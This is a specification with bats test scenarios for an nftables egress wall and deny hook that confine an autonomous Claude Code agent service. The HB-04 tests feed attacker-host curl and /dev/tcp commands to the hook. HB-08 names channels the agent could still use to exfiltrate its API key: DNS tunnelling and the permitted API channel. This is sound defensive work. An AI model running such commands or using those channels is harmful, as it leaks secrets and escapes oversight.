  Design §5 is the authoritative full form. Implementers MUST use design §5 and MUST NOT omit `--gid=9001`, `--pipe`, `--quiet`, `--collect`, `--unit=osgania-egress-selfcheck`, or `--property=Environment=''`.

**HB-06.3** If any check (a), (b), or (c) fails, `provision-agent.sh` MUST abort with exit code > 0, print a clear error identifying the failed check, and MUST NOT write any allow entries to `managed-settings.json`. For check (b) failure (root positive-control connect fails), the error MUST specifically report the canary as unreachable/unsuitable.

**HB-06.4** The machine check is not a one-time gate — it is part of `provision-agent.sh`'s Unit 3 step. A re-provision, a Unit 2 rollback, or an out-of-order operator run on a fresh box will all trigger this check and fail correctly, preventing a capable allowlist from landing on an unprotected host.

**HB-06.5 — PR/chained-PR ordering (enforcement layer 1).** The chained-PR delivery (feature-branch-chain strategy) enforces the ordering structurally: Unit 3's PR targets the Unit 2 branch and cannot merge to the tracker without Unit 2's egress commit preceding it. This is the first enforcement layer; HB-06.2 is the second (runtime). **Enforced by delivery process only — no bats scenario.**

**Isolation boundary (HB-06):** The machine check runs as root (the provisioner is root-only). aios cannot manipulate it. The hermetic self-check as uid 9001 exercises the actual wall state, not a static config assertion.

---

### HB-07 — Egress behavioral contract (hardware-proven)

> These are testable behavioral assertions derived from hardware gate results (2026-06-17). They encode the PROVEN end-state, not aspirational behavior.

**HB-07.1** From uid 9001 on the provisioned host:
- A TLS connection to `160.79.104.10:443` (Anthropic IPv4) MUST succeed (connection established).
- A TLS connection to `2607:6bc0::10:443` (Anthropic IPv6) MUST succeed (connection established).
- A TLS connection to `1.1.1.1:443` (Cloudflare DNS-over-HTTPS — non-Anthropic) MUST be dropped/refused.
- A TLS connection to any GitHub IP on port 443 MUST be dropped/refused.
- A TLS connection to any Cloudflare IPv6 address on port 443 (e.g. `2606:4700:4700::1111:443`) MUST be dropped/refused.
- A TLS connection to any Datadog IP (e.g. `34.149.66.137:443`) MUST be dropped/refused.

**HB-07.2** A real `claude -p "<prompt>"` run under `osgania-agent.service` MUST succeed end-to-end with `apiKeySource:ANTHROPIC_API_KEY`, `is_error:false`, and `terminal_reason:completed`. DNS resolution of `api.anthropic.com`, TCP connection to `160.79.104.10:443`, and the full authentication+API exchange all work under the wall (hardware-proven).

**HB-07.3** Root and all other non-aios uids MUST retain full network access. The wall is scoped to uid 9001; no SSH/ops lockout occurs.

**HB-07.4** `nft list ruleset` (as root) MUST show the `osgania_egress` table and both chains after a reboot (persistence, HB-02.7).

**Testability classification (HB-07):** ALL assertions in HB-07 are LINUX-ROOT/LIVE-KEY deferred — they require a real Linux host with root, a loaded nft ruleset, and (for HB-07.2) a live Anthropic API key. They MUST be run via `scripts/run-live-key-tests.sh` on the disposable VPS.

---

### HB-08 — Egress wall: residual (accepted, documented)

**HB-08.1 — Accepted irreducible residual.** 2b explicitly accepts the following as irreducible given its design choices:

1. **Legitimate-channel exfil**: data smuggled inside the `api.anthropic.com:443` TLS channel the agent is permitted to use. No IP-pin filter can stop this; it is irreducible for any agent that talks to Anthropic.
2. **DNS tunneling over the local stub**: uid 9001 resolves via `127.0.0.53` (systemd-resolved); crafted subdomain queries can carry ~108 bytes (the key). Bounded by single-tenancy and the key size. NOT mitigated in 2b (the explore's IP-pin-api.anthropic.com alternative was declined for fragility).

**HB-08.2** The nft wall CLOSES the following channels that were previously open on the live box:
- HTTPS to any non-Anthropic host from uid 9001 (e.g. attacker-controlled exfil endpoint).
- Raw `/dev/tcp` connects (also denied by guardia HA-15.5a, but belt-and-suspenders).
- Arbitrary-port outbound (reverse shells, non-443 channels).

**HB-08.3** Apt, NTP, and upstream DNS traffic are NOT affected by the wall (hardware-confirmed: those services run under uids other than 9001). This is documented so it is not mistaken for a gap.

---

### HB-09 — Updated rollback procedure

> Extends 2a HA-12.1. Rollback of 2b MUST leave the box in a verified 2a end-state.

**HB-09.1** A complete rollback of 2b MUST be possible by performing the following in order:

1. Write the empty allow[] back to `managed-settings.json`: `jq '.permissions.allow = []' ... > tmpfile && mv tmpfile /etc/claude-code/managed-settings.json`.
2. Remove the `--permission-mode dontAsk` flag from `agent-run.sh` (or reinstall the 2a version of the wrapper).
3. Revert `guardia.sh` to the 2a version (reinstate `permissionDecision:"defer"` in the benign branch; or reinstall the 2a guardia template).
4. Flush and remove the nft egress table: `nft delete table inet osgania_egress`.
5. Remove the nft persistence unit/drop-in (design phase specifies the mechanism).
6. Remove the `DISABLE_TELEMETRY=1` and `DISABLE_ERROR_REPORTING=1` env directives from the unit, or reinstall the 2a unit template.
7. Run `systemctl daemon-reload`.

**HB-09.2** After rollback, the box MUST be in the verified 2a end-state: `allow == []`, `defaultMode == "default"`, 6 deny entries, guardia deny/defer behavior (benign defers), no nft egress table, HA-09 probe still VERIFIED.

**HB-09.3** The prompt file `/opt/osgania/platform/prompts/agent-prompt.txt` and its parent directory MAY be left in place during rollback without creating a security regression — the prompt file is root-owned, mode 0644, and has no effect when the service is off or reset.

---

### HB-10 — Updated file structure

> Extends 2a HA-14.1.

**HB-10.1** The following files MUST exist in the repository after 2b is applied:

```
scripts/
  provision-agent.sh         — 2b-updated installer (STEP 0 + Unit 2 + Unit 3 steps; updated from 2a)
platform/
  bin/
    agent-run.sh             — updated wrapper: adds prompt-source read + --permission-mode dontAsk (HB-01, HB-03.4)
  hooks/
    guardia.sh               — updated: benign branch = pass-through (HB-04; was defer)
                               (Unit 3 ONLY — MUST NOT ship in U1/U2 PRs; guardia stays 2a defer version through U1+U2)
  nft/
    osgania-egress.nft       — nft ruleset template (HB-02; installed to /etc/osgania/nft/osgania-egress.nft)
  prompts/
    agent-prompt.txt         — root-owned prompt file template (HB-01.3/HB-01.4)
                               installed to /opt/osgania/platform/prompts/agent-prompt.txt (root:root 0644)
  systemd/
    osgania-agent.service    — 2b-updated: adds After=nftables.service + Wants=nftables.service (HB-02.7a)
                               + Environment=DISABLE_TELEMETRY=1 + Environment=DISABLE_ERROR_REPORTING=1 (HB-02.8)
    osgania-agent.timer      — 2b-updated: adds After=nftables.service + Wants=nftables.service (HB-02.7a)
tests/
  provision-agent.bats       — updated: STEP 0 + Unit 2 config assertions + Unit 3 expected-set assertion
  guardia.bats               — updated: benign commands now yield NO PreToolUse decision (not defer)
  egress.bats                — NEW: host-safe assertions for nft config structure + env vars in unit
                               + LINUX-ROOT/LIVE-KEY deferred scenarios for live wall behavior (HB-07)
```

**HB-10.2** All shell scripts in `platform/` and `scripts/` MUST pass `shellcheck -s bash` with no warnings or errors after the 2b changes.

---

## Behavioral Scenarios

Scenarios continue the HA-xx / HB-xx ID family. All scenarios are written for `bats-core`.

### Testability classification

| Label | Meaning |
|-------|---------|
| HOST-SAFE | Pure string/JSON/config assertions; no root, no systemd, no real nft; runs on macOS/Linux CI |
| LINUX-ROOT | Requires real Ubuntu + root; skips off-target with explicit message |
| LINUX-ROOT/LIVE-KEY | Requires Linux + root + live Anthropic API key; run ONLY via `scripts/run-live-key-tests.sh` |

---

### HB-01 — STEP 0 scenarios

#### HB-01-S1 — Wrapper installed with correct owner and mode after STEP 0 (LINUX-ROOT)

**Requirement**: HB-01.1

```
GIVEN provision-agent.sh STEP 0 has run on a half-provisioned box
WHEN `stat -c '%U:%G %a' /opt/osgania/platform/bin/agent-run.sh` is run
THEN output is "root:root 755"
```

#### HB-01-S2 — Wrapper contains prompt-source read and canonical dontAsk exec line (HOST-SAFE)

**Requirement**: HB-01.3, HB-03.4

```
GIVEN the repo wrapper template platform/bin/agent-run.sh (2b version)
THEN the wrapper contains a `cat` read of the canonical prompt file path via $PROMPT_FILE
 AND the wrapper contains the exact exec form:
     exec /usr/bin/claude --permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"
 AND `--permission-mode dontAsk` appears BEFORE `-p` in that exec line
 AND the variable is named $PROMPT_FILE (double-quoted)
 AND the wrapper does NOT contain `--bare`
 AND the wrapper does NOT contain a bare `exec /usr/bin/claude "$@"` without the dontAsk flag
```

#### HB-01-S3 — Prompt file is root-owned, world-readable, and not writable by aios (LINUX-ROOT)

**Requirement**: HB-01.4

```
GIVEN provision-agent.sh STEP 0 has run
WHEN `stat -c '%U:%G %a' /opt/osgania/platform/prompts/agent-prompt.txt` is run
THEN the owner is "root:root"
 AND the mode is 0644

WHEN `test -r /opt/osgania/platform/prompts/agent-prompt.txt` is run as aios
THEN exit code is 0 (aios CAN read the prompt file — mode 0644 allows world-read)

WHEN `test -w /opt/osgania/platform/prompts/agent-prompt.txt` is run as aios
THEN exit code is non-zero (aios CANNOT write to the prompt file)
```

#### HB-01-S4 — Prompt file is outside /opt/osgania/client (HOST-SAFE)

**Requirement**: HB-01.4

```
GIVEN the prompt file path defined in platform/bin/agent-run.sh ($PROMPT_FILE)
THEN the path equals "/opt/osgania/platform/prompts/agent-prompt.txt"
 AND the path does NOT begin with "/opt/osgania/client"
     (the path must not be inside the agent-writable WorkingDirectory)
```

#### HB-01-S2b — Wrapper rejects invocation without -p (HOST-SAFE)

**Requirement**: HB-01.8

```
GIVEN the repo wrapper template platform/bin/agent-run.sh (2b version)
WHEN the wrapper is invoked without the -p argument (e.g. ./agent-run.sh with no args)
THEN exit code is non-zero
 AND stderr contains a message indicating -p is required
 AND no claude process is exec'd
```

#### HB-01-S5 — ExecStart is byte-identical after STEP 0 (HOST-SAFE, unit-string assertion)

**Requirement**: HB-01.3, HB-01.6

```
GIVEN the assembled osgania-agent.service unit string (2b version)
THEN ExecStart line matches exactly: "ExecStart=/opt/osgania/platform/bin/agent-run.sh -p"
 AND the string does NOT contain "--bare"
 AND the string does NOT contain "--permission-mode" (dontAsk is in the wrapper, not ExecStart)
```

#### HB-01-S6 — Service starts and produces audit record after STEP 0 (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-01.5

```
GIVEN provision-agent.sh STEP 0 has run on a restored box
WHEN `systemctl start osgania-agent.service` is run
THEN exit code is 0
 AND the journal does NOT contain "Input must be provided"
 AND /var/log/osgania/audit.jsonl contains at least one new record after the start
```

---

### HB-02 — nft egress wall scenarios

#### HB-02-S1 — nft ruleset template contains correct chain structure (HOST-SAFE)

**Requirement**: HB-02.1

```
GIVEN the file platform/nft/osgania-egress.nft
THEN it contains "table inet osgania_egress"
 AND it contains "meta skuid 9001 jump aios_egress"
 AND it contains "chain aios_egress"
 AND it contains "counter drop"
 AND it does NOT use "cgroup" matching
```

#### HB-02-S2 — nft template contains both Anthropic CIDRs (HOST-SAFE)

**Requirement**: HB-02.2, HB-02.4

```
GIVEN the file platform/nft/osgania-egress.nft
THEN it contains "ip daddr 160.79.104.0/23 tcp dport 443 accept"
 AND it contains "ip6 daddr 2607:6bc0::/48 tcp dport 443 accept"
 AND it contains "ip daddr 127.0.0.0/8 accept"
 AND it contains "ip6 daddr ::1/128 accept"
```

#### HB-02-S2b — nft ruleset install is idempotent (LINUX-ROOT)

**Requirement**: HB-02.9

```
GIVEN provision-agent.sh Unit 2 step has run once on the target host
WHEN provision-agent.sh Unit 2 step is run a SECOND time on the same host
THEN `nft list ruleset` shows exactly ONE table named `osgania_egress` (not two)
 AND the chains and rules are identical to after the first run
```

#### HB-02-S2c — Service unit declares After=nftables.service (HOST-SAFE)

**Requirement**: HB-02.7a

```
GIVEN the repo file platform/systemd/osgania-agent.service (2b version)
THEN the unit file contains "After=nftables.service"
 AND the unit file contains either "Wants=nftables.service" or "Requires=nftables.service"
```

#### HB-02-S2d — Timer unit declares After=nftables.service (HOST-SAFE)

**Requirement**: HB-02.7a

```
GIVEN the repo file platform/systemd/osgania-agent.timer (2b version)
THEN the timer unit file contains "After=nftables.service"
 AND the timer unit file contains either "Wants=nftables.service" or "Requires=nftables.service"
```

#### HB-02-S3 — Unit contains telemetry-disable env vars (HOST-SAFE, unit-string assertion)

**Requirement**: HB-02.8

```
GIVEN the assembled osgania-agent.service unit string (2b version)
THEN the string contains "Environment=DISABLE_TELEMETRY=1"
 AND the string contains "Environment=DISABLE_ERROR_REPORTING=1"
```

#### HB-02-S4 — nft table loaded on host after Unit 2 provisioning (LINUX-ROOT)

**Requirement**: HB-02.1, HB-02.7

```
GIVEN provision-agent.sh Unit 2 step has run on the target host
WHEN `nft list table inet osgania_egress` is run as root
THEN exit code is 0
 AND output contains "aios_egress"
 AND output contains "meta skuid 9001"
 AND output contains "counter drop"
```

#### HB-02-S5 — uid 9001 blocked from non-Anthropic destinations (LINUX-ROOT)

**Requirement**: HB-02.3, HB-07.1

```
GIVEN the nft egress wall is loaded (HB-02-S4 passes)
WHEN a TLS connection to 1.1.1.1:443 is attempted as uid 9001
THEN the connection is blocked (connect() returns ECONNREFUSED or times out)
 AND `nft list table inet osgania_egress` shows a non-zero drop counter
```

#### HB-02-S6 — uid 9001 can reach Anthropic IPv4 endpoint (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-07.1, HB-07.2

```
GIVEN the nft egress wall is loaded
WHEN a TLS connection to 160.79.104.10:443 is attempted as uid 9001
THEN the connection succeeds (TLS handshake completes)
```

#### HB-02-S7 — uid 9001 can reach Anthropic IPv6 endpoint (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-07.1, HB-02.4

```
GIVEN the nft egress wall is loaded
  AND the host has a global IPv6 address
WHEN a TLS connection to 2607:6bc0::10:443 is attempted as uid 9001
THEN the connection succeeds (TLS handshake completes)
```

#### HB-02-S8 — root retains full network access under the wall (LINUX-ROOT)

**Requirement**: HB-02.6, HB-07.3

```
GIVEN the nft egress wall is loaded
WHEN a TLS connection to 1.1.1.1:443 is attempted as root (uid 0)
THEN the connection succeeds (root is not uid 9001; wall does not apply)
```

#### HB-02-S9 — real claude -p works end-to-end under the wall (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-07.2

```
GIVEN the nft egress wall is loaded
  AND the agent runtime is configured (STEP 0 complete)
WHEN `systemctl start osgania-agent.service` is triggered with a prompt that requires an API call
THEN the run completes with terminal_reason = "completed"
 AND stream-json contains apiKeySource = "ANTHROPIC_API_KEY"
 AND is_error = false
 AND the journal does NOT contain "ECONNREFUSED" for api.anthropic.com
```

---

### HB-03 — Autonomy (allow[]) scenarios

#### HB-03-S1 — Allowlist equals exactly the reviewed expected-set (HOST-SAFE against fixture)

**Requirement**: HB-03.2, Amendment A2

```
GIVEN a fixture managed-settings.json with the reviewed expected allow[] entries
WHEN provision-agent.sh's allow[] structural verify runs against the fixture
THEN .permissions.allow | length equals the expected-set length
 AND every expected entry is present in .permissions.allow
 AND no entry is present that is not in the expected-set
```

#### HB-03-S2 — Unexpected allow entry causes provisioner abort (HOST-SAFE against fixture)

**Requirement**: HB-03.2, HB-06.3

```
GIVEN a fixture managed-settings.json where .permissions.allow contains one unexpected entry
  (an entry not present in the reviewed expected-set)
WHEN provision-agent.sh's allow[] structural verify runs against the fixture
THEN exit code > 0
 AND stderr identifies the unexpected entry
```

#### HB-03-S3 — Non-allowlisted command auto-denies cleanly under dontAsk (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-03.5

```
GIVEN the Unit 3 posture is active (allow[] populated, dontAsk CLI flag, guardia pass-through)
WHEN `claude -p` is asked to run a command NOT in the allow[] (e.g. `cat /etc/hostname`)
THEN terminal_reason = "completed" (NOT "tool_deferred")
 AND permission_denials contains the denied command
 AND the command does NOT execute
```

#### HB-03-S4 — defaultMode remains "default" in managed-settings.json after Unit 3 (HOST-SAFE against fixture)

**Requirement**: HB-03.4, PSC R9.8 (unchanged)

```
GIVEN a fixture managed-settings.json written by provision-agent.sh Unit 3 step
WHEN `jq '.permissions.defaultMode'` is run
THEN output is "default"
     (dontAsk is NOT in managed-settings.json — it is only in the wrapper CLI flag)
```

---

### HB-04 — guardia benign pass-through scenarios

#### HB-04-S1 — Benign Bash command produces NO PreToolUse decision (HOST-SAFE)

**Requirement**: HB-04.1, Amendment A1

```
GIVEN tool_name = "Bash"
  AND tool_input.command = "npm test"   (a benign command not matching any deny rule)
WHEN guardia.sh receives this STDIN JSON (2b version)
THEN stdout is empty (or whitespace-only)
 AND exit code = 0
 AND stdout does NOT contain "permissionDecision"
```

#### HB-04-S2 — ls, git status produce NO PreToolUse decision (HOST-SAFE)

**Requirement**: HB-04.1

```
GIVEN tool_name = "Bash"
  AND tool_input.command = "ls -la /opt/osgania/client"
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout is empty
 AND exit code = 0

GIVEN tool_name = "Bash"
  AND tool_input.command = "git status"
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout is empty
 AND exit code = 0
```

#### HB-04-S3 — DENY rules remain unchanged: sudo still denies (HOST-SAFE)

**Requirement**: HB-04.2, PSC R2.1

```
GIVEN tool_name = "Bash"
  AND tool_input.command = "sudo apt-get update"
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout contains permissionDecision = "deny"
 AND permissionDecisionReason contains "sudo"
 AND exit code = 0
```

#### HB-04-S4 — DENY rules remain unchanged: curl still denies (HOST-SAFE)

**Requirement**: HB-04.2, PSC R2.2

```
GIVEN tool_name = "Bash"
  AND tool_input.command = "curl https://attacker.example.com/"
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout contains permissionDecision = "deny"
 AND permissionDecisionReason contains "curl"
```

#### HB-04-S5 — DENY rules remain unchanged: /dev/tcp still denies (HOST-SAFE)

**Requirement**: HB-04.2, HA-15.5a

```
GIVEN tool_name = "Bash"
  AND tool_input.command = "exec 3<>/dev/tcp/attacker.example.com/443"
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout contains permissionDecision = "deny"
 AND permissionDecisionReason contains "net-builtin"
```

#### HB-04-S6 — Non-Bash tool produces NO PreToolUse decision (HOST-SAFE)

**Requirement**: HB-04.3

```
GIVEN tool_name = "Read"
  AND tool_input = {"file_path": "/opt/osgania/client/README.md"}
WHEN guardia.sh (2b version) receives this STDIN JSON
THEN stdout is empty
 AND exit code = 0
```

#### HB-04-S7 — guardia.sh shellcheck clean after 2b changes (HOST-SAFE)

**Requirement**: HB-04.4, HB-10.2

```
GIVEN the file platform/hooks/guardia.sh (2b version)
WHEN `shellcheck -s bash platform/hooks/guardia.sh` is executed
THEN exit code = 0
 AND stdout/stderr contain no warnings or errors
```

#### HB-04-S8 — Empty or non-JSON STDIN produces empty stdout and exit 0 (HOST-SAFE)

**Requirement**: HB-04.5

```
GIVEN guardia.sh (2b version) receives empty STDIN (zero bytes)
WHEN guardia.sh executes
THEN stdout is empty (or whitespace-only)
 AND exit code = 0
 AND stdout does NOT contain "permissionDecision"

GIVEN guardia.sh (2b version) receives non-JSON STDIN (e.g. "not-json")
WHEN guardia.sh executes
THEN stdout is empty (or whitespace-only)
 AND exit code = 0
 AND stdout does NOT contain "permissionDecision"
```

---

### HB-05 — HA-09 probe oracle scenarios

#### HB-05-S1 — HA-09 probe invokes /usr/bin/claude directly and does not include --permission-mode dontAsk (HOST-SAFE)

**Requirement**: HB-05.2, HB-05.4

```
GIVEN the source of scripts/provision-agent.sh (2b version)
WHEN the file is searched for the HA-09 probe invocation block (run_defense_in_depth_probe function)
THEN (1) the probe invocation calls /usr/bin/claude directly —
         it does NOT contain "$wrapper" or "agent-run.sh" as the invoked binary
 AND (2) the probe invocation does NOT contain the substring "--permission-mode dontAsk"
 AND (3) the probe invocation contains "--dangerously-skip-permissions"
 AND (4) the probe invocation contains "--output-format stream-json"
```

Note: assertions (1)–(4) are all grep-based source assertions (HOST-SAFE). The probe was refactored from the 2a form (which called `"$wrapper"`, safe only because the 2a wrapper was a transparent pass-through) to invoke claude directly in 2b, because the 2b wrapper discards the probe's args and injects --permission-mode dontAsk (HB-01.3, JD-6 resolution).

---

### HB-06 — Delivery-ordering invariant scenarios

#### HB-06-S1 — Unit 3 step aborts if nft table absent and nothing is written (LINUX-ROOT)

**Requirement**: HB-06.2a, HB-06.3

```
GIVEN the nft egress table has NOT been loaded (no osgania_egress table present)
  AND a snapshot of managed-settings.json content is taken BEFORE running the Unit 3 step
WHEN provision-agent.sh Unit 3 step is run
THEN exit code > 0
 AND stderr contains a message identifying "egress wall not loaded" or equivalent
 AND managed-settings.json content after the run is BYTE-IDENTICAL to the snapshot
     (proves nothing was written — not merely that allow[] is still [])
```

#### HB-06-S2 — Unit 3 step aborts if hermetic self-check fails (LINUX-ROOT)

**Requirement**: HB-06.2b, HB-06.3

```
GIVEN the nft egress table is loaded BUT a non-Anthropic TLS connection from uid 9001 succeeds
  (simulated by temporarily removing the drop rule — test harness only)
WHEN provision-agent.sh Unit 3 step is run
THEN exit code > 0
 AND stderr contains a message identifying "hermetic self-check failed" or equivalent
 AND managed-settings.json is NOT modified
```

#### HB-06-S2b — Hermetic self-check command signals REFUSE when wall is absent (LINUX-ROOT)

**Requirement**: HB-06.2b

```
GIVEN the nft egress wall is NOT loaded (no osgania_egress table)
  AND the self-check command (bash /dev/tcp or python3 socket) is run as uid 9001 to 1.1.1.1:443
WHEN the self-check command executes
THEN it exits 0 (the TCP connect SUCCEEDS — wall is absent)
  AND the provisioner gate interprets exit 0 as WALL FAIL → REFUSE signal

GIVEN the nft egress wall IS loaded and uid-9001 traffic to 1.1.1.1:443 is DROPped
  AND the self-check command (with timeout 5) is run as uid 9001 to 1.1.1.1:443
WHEN the self-check command executes
THEN it exits 124 (the TCP connect TIMES OUT — wall is present; `timeout` exits 124 on timeout)
  AND the provisioner gate interprets exit 124 as WALL OK → PROCEED signal
  AND any other non-zero exit (e.g. exit 1 = ECONNREFUSED) is REFUSE (fail-closed)
```

Note: exit code semantics are intentionally inverted from typical conventions: 0 = connected = wall absent = REFUSE; exit 124 = blocked/timeout = wall present = PROCEED; non-124 non-0 = ambiguous = REFUSE.

Note for LINUX-ROOT bats implementation: the self-check MUST be wrapped in a run-timeout envelope (e.g. `bats --timeout 10` or an outer `timeout` on the `run` call) so a hung connect cannot stall the entire test suite.

#### HB-06-S3 — Unit 3 step proceeds when wall is present and hermetic (LINUX-ROOT/LIVE-KEY)

**Requirement**: HB-06.2, HB-06.4

```
GIVEN the nft egress wall is loaded AND a non-Anthropic connection from uid 9001 is blocked
WHEN provision-agent.sh Unit 3 step is run
THEN exit code = 0
 AND managed-settings.json .permissions.allow equals the reviewed expected-set
 AND the hermetic self-check passed (logged in provisioner output)
```

---

## Requirements-to-scenario map

| Requirement | Scenarios | Note |
|-------------|-----------|------|
| HB-01.1 | HB-01-S1 | |
| HB-01.3, HB-03.4 | HB-01-S2 | |
| HB-01.4 | HB-01-S3, HB-01-S4 | |
| HB-01.3, HB-01.6 | HB-01-S5 | |
| HB-01.5 | HB-01-S6 | LINUX-ROOT/LIVE-KEY |
| HB-01.8 | HB-01-S2b | |
| HB-02.1 | HB-02-S1, HB-02-S4 | |
| HB-02.2, HB-02.4 | HB-02-S2 | |
| HB-02.7a | HB-02-S2c, HB-02-S2d | HOST-SAFE unit-string assertions (service + timer) |
| HB-02.8 | HB-02-S3 | |
| HB-02.9 | HB-02-S2b | LINUX-ROOT |
| HB-02.3, HB-07.1 | HB-02-S5 | |
| HB-07.1, HB-07.2 | HB-02-S6 | LINUX-ROOT/LIVE-KEY |
| HB-02.4 | HB-02-S7 | LINUX-ROOT/LIVE-KEY |
| HB-02.6, HB-07.3 | HB-02-S8 | |
| HB-07.2 | HB-02-S9 | LINUX-ROOT/LIVE-KEY |
| HB-02.7, HB-07.4 | (none — reboot persistence) | Hardware/reboot required; process-enforced via HB-02-S4 + HB-02.7a unit ordering |
| HB-03.2, Amendment A2 | HB-03-S1 | |
| HB-03.2, HB-06.3 | HB-03-S2 | |
| HB-03.5 | HB-03-S3 | LINUX-ROOT/LIVE-KEY |
| HB-03.4, PSC R9.8 | HB-03-S4 | |
| HB-04.1, Amendment A1 | HB-04-S1 | |
| HB-04.1 | HB-04-S2 | |
| HB-04.2, PSC R2.1 | HB-04-S3 | |
| HB-04.2, PSC R2.2 | HB-04-S4 | |
| HB-04.2, HA-15.5a | HB-04-S5 | |
| HB-04.3 | HB-04-S6 | |
| HB-04.4, HB-10.2 | HB-04-S7 | |
| HB-04.5 | HB-04-S8 | HOST-SAFE — empty/non-JSON STDIN early-return produces pass-through |
| HB-05.1 | (probe survival covered by HB-01-S6 + HA-09 probe) | LINUX-ROOT/LIVE-KEY — probe survival tested by running HA-09 probe after Unit 3 |
| HB-05.2 | HB-05-S1 | HOST-SAFE — grep-based source assertions: (1) probe calls /usr/bin/claude directly (not "$wrapper"/agent-run.sh); (2) probe MUST NOT contain --permission-mode dontAsk; (3) probe contains --dangerously-skip-permissions; (4) probe contains --output-format stream-json |
| HB-05.4 | HB-05-S1 | HOST-SAFE — same grep assertions confirm the direct-claude form delivers the stream-json init event oracle intact |
| HB-06.2a, HB-06.3 | HB-06-S1 | |
| HB-06.2b, HB-06.3 | HB-06-S2, HB-06-S2b | |
| HB-06.2, HB-06.4 | HB-06-S3 | LINUX-ROOT/LIVE-KEY |
| HB-06.4 (re-provision triggers check) | (covered by HB-06-S1/S2/S3 combined) | Process-enforced; gate runs in the provisioner on every Unit 3 execution |
| HB-06.5 | (none) | Enforced by delivery process only — no bats scenario |
| HB-02.10 | (none — documentation requirement) | No automated scenario; the UID-isolation assumption MUST appear as a comment in the `.nft` template and the provisioner's unit2 install function |

---

## Open items for the design phase

| # | Item | Impact | Status |
|---|------|--------|--------|
| D1 | Prompt file path | **RESOLVED** — `platform/prompts/agent-prompt.txt` → `/opt/osgania/platform/prompts/agent-prompt.txt` (`root:root 0644`). See HB-01.4 and design §3. | HB-01-S3/S4 fixture updated |
| D2 | nft persistence mechanism (HB-02.7) — systemd unit loading the `.nft` file vs `/etc/nftables.conf` drop-in; boot ordering relative to `osgania-agent.service` | **RESOLVED** — design §2 (`nftables.service` drop-in + `After=nftables.service`) | HB-02-S4/HB-07.4 |
| D3 | Hermetic self-check tooling (HB-06.2b) | **RESOLVED** — `systemd-run --uid=9001` transient with `/bin/bash -c 'timeout 5 bash -c "exec 3<>/dev/tcp/1.1.1.1/443"'` (NOT `/bin/sh`/dash; no `; echo $?` suffix); exit-0 = connected = wall absent = REFUSE; timeout(124) = wall present = PROCEED; any other exit = REFUSE. See design §5 and HB-06.2b. | HB-06-S1/S2/S3 |
| D4 | Exact reviewed allow[] entries — derived from observed real `claude -p` runs AFTER STEP 0 is deployed, then reviewed; design phase documents the derivation procedure | Open — apply-time output, not a design artifact | HB-03-S1 fixture |
| D5 | ExecStart / wrapper dontAsk flag order | **RESOLVED** — canonical form is `exec /usr/bin/claude --permission-mode dontAsk -p "$(cat "$PROMPT_FILE")"` (dontAsk BEFORE -p, no `"$@"` in the final claude invocation). See HB-01.3 and design §3. | HB-01-S2 |
| D6 | CIDR constant refresh procedure — what operator action is required if Anthropic changes its published range with notice | **RESOLVED** — design §2 documents; operator edits two constants + re-provisions | HB-02.2, accepted tradeoff |

---

## Deferred Judgment Day findings (Round 3) — ALL RESOLVED

> Two blind adversarial review rounds were applied to this spec + design (Round 1: 14 fixes; Round 2: 8 fixes, including a self-check `echo $?` regression). A third blind round surfaced the cluster below. All JD-1…JD-6 findings and the minors are now RESOLVED in the contracts (spec.md + design.md + tasks.md WU0). **Judgment Day terminal state: RESOLVED.**

| JD | Finding | Resolution |
|----|---------|------------|
| JD-1 | **RESOLVED — python3 self-check must distinguish timeout (exit 124) from refused.** `sys.exit(0 if s.connect_ex(...)==0 else 1)` mapped ETIMEDOUT and ECONNREFUSED both to exit 1. Fixed: both forms now exit 124 on timeout only. HB-06.2b updated: python3 form uses try/except `socket.timeout` → exit 124, `OSError` → exit 1; bash form unchanged (`timeout` exits 124). Provisioner gate logic stated explicitly: write allow[] ONLY on exit 124; exit 0 = REFUSE; any non-124 non-0 = REFUSE. Design §5 python3 block and design Checklist bullet also aligned. |
| JD-2 | **RESOLVED — HB-06-S2b PROCEED branch now asserts exit 124 specifically.** The scenario previously said "exits non-zero = PROCEED" which would have treated ECONNREFUSED (exit 1) as PROCEED → fail-open if wall used `reject`. Fixed in HB-06-S2b: PROCEED branch asserts exit 124; a note clarifies non-124 non-0 = REFUSE. Suite-stall note added (bats run-timeout envelope required). |
| JD-3 | **RESOLVED — design Checklist fail-closed bullet aligned to canonical body forms.** The stale `socket.create_connection` reference and bare `timeout` wording removed; bullet now references the `/bin/bash -c 'timeout 5 bash -c "exec 3<>/dev/tcp/<canary>/443"'` form and the try/except python3 form (per JD-1), with explicit exit-0=REFUSE, exit-124=PROCEED, other=REFUSE semantics. |
| JD-4 | **RESOLVED — HB-10.1 manifest completed.** Added `platform/systemd/osgania-agent.service` (2b: `After=nftables.service` + `Wants=nftables.service` + `DISABLE_TELEMETRY=1` + `DISABLE_ERROR_REPORTING=1`) and `platform/systemd/osgania-agent.timer` (2b: `After=nftables.service` + `Wants=nftables.service`) to the HB-10.1 file manifest. `platform/hooks/guardia.sh` entry annotated "(Unit 3 ONLY — MUST NOT ship in U1/U2 PRs)". |
| JD-5 | **RESOLVED — spec HB-06.2b now includes the full `systemd-run` flag set.** Added the complete invocation with `--uid=9001 --gid=9001 --pipe --quiet --collect --property=RestrictAddressFamilies='AF_INET AF_INET6' --property=Environment=''`, `</dev/null`, and a note that design §5 is the authoritative form. Also documented the `restore` trap behavior (must kill/stop the orphaned uid-9001 transient on interrupt). |
